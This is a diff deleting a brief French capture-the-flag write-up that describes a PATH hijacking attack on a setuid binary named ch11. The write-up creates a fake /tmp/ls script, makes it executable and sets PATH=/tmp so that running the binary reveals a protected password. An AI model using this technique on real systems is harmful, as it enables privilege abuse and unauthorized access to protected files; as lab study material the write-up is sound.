@@ -1,9 +1,0 @@
-System fait appel à /bin/sh avec les droits de l'utilisateur qui a compilé le binaire. 
-On crée un fichier /tmp/ls qui contient :
-
-#!/bin/cat
-
-Puis on chmod 755 /tmp/ls
-
-On modifie ensuite le PATH=/tmp
-En lancant ch11, le mot de passe apparait.
